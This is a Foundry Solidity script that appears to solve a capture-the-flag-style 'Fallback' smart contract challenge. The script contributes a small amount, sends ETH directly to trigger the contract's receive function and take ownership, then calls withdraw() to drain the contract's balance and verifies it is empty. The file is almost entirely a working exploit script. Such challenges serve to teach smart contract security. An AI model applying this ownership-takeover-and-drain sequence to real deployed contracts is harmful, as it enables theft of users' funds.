// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../DeployedSolver.s.sol";

/**
 * @title FallbackSolver
 * @notice Script to solve the deployed Fallback challenge
 * @dev Run with `forge script script/solutions/FallbackSolver.s.sol --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast`
 */
contract FallbackSolver is DeployedSolverBase {
    address payable public fallbackContract;
    
    function setUp() public override {
        super.setUp();
        
        // Get the deployed instance address
        address instanceAddress = vm.envAddress("FALLBACK_ADDRESS");
        fallbackContract = payable(instanceAddress);
        
        console.log("Fallback contract address:", address(fallbackContract));
        
        // Get the current owner
        bytes memory ownerCall = abi.encodeWithSignature("owner()");
        (, bytes memory data) = fallbackContract.staticcall(ownerCall);
        address owner = abi.decode(data, (address));
        
        console.log("Initial owner:", owner);
        console.log("Player address:", playerAddress);
    }
    
    function run() public {
        // Make sure we have enough ETH
        require(playerAddress.balance > 0, "Not enough ETH in player account");
        
        // Step 1: Get initial contribution
        bytes memory getContribCall = abi.encodeWithSignature("getContribution()");
        (bool getSuccess, bytes memory contribData) = fallbackContract.staticcall(getContribCall);
        uint256 initialContribution = abi.decode(contribData, (uint256));
        console.log("Initial contribution:", initialContribution);
        
        // Step 2: Contribute a small amount to get listed in contributions
        console.log("Step 1: Contributing a small amount...");
        bytes memory contributeCall = abi.encodeWithSignature("contribute()");
        (bool contribSuccess,) = fallbackContract.call{value: 0.0001 ether}(contributeCall);
        require(contribSuccess, "Contribution failed");
        
        // Verify contribution was recorded
        (getSuccess, contribData) = fallbackContract.staticcall(getContribCall);
        uint256 newContribution = abi.decode(contribData, (uint256));
        console.log("New contribution:", newContribution);
        
        // Step 3: Trigger the receive function to become owner
        console.log("Step 2: Triggering receive function...");
        (bool receiveSuccess,) = fallbackContract.call{value: 0.0001 ether}("");
        require(receiveSuccess, "Receive call failed");
        
        // Step 4: Verify player is now the owner
        bytes memory ownerCall = abi.encodeWithSignature("owner()");
        (, bytes memory ownerData) = fallbackContract.staticcall(ownerCall);
        address newOwner = abi.decode(ownerData, (address));
        console.log("New owner:", newOwner);
        require(newOwner == playerAddress, "Player is not the owner");
        
        // Step 5: Withdraw all funds
        console.log("Step 3: Withdrawing all funds...");
        uint256 balanceBefore = address(fallbackContract).balance;
        bytes memory withdrawCall = abi.encodeWithSignature("withdraw()");
        (bool withdrawSuccess,) = fallbackContract.call(withdrawCall);
        require(withdrawSuccess, "Withdraw failed");
        
        // Step 6: Verify the contract balance is 0
        uint256 balanceAfter = address(fallbackContract).balance;
        console.log("Balance before:", balanceBefore);
        console.log("Balance after:", balanceAfter);
        require(balanceAfter == 0, "Contract still has funds");
        
        logSuccess();
    }
} 